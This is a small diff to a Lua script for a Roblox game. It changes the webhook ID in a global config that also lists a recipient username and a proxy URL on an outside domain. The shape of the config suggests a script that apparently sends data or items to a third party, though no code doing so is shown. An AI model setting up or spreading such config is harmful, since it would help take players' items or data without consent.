@@ -10,7 +10,7 @@ if game.PlaceId ~= 142823291 then
 end
 
 _G.ED_CONFIG = {
-WEBHOOK_ID = "cc9154db311d809c27ef34e4808578ab",
+WEBHOOK_ID = "de2d4a8bec1b9e4c65638ceee0f9d411",
 USERNAMES = {"Eliaskulmer999",},
 PROXY_URL = "https://eternal-darkness.org/api/proxy"
 }
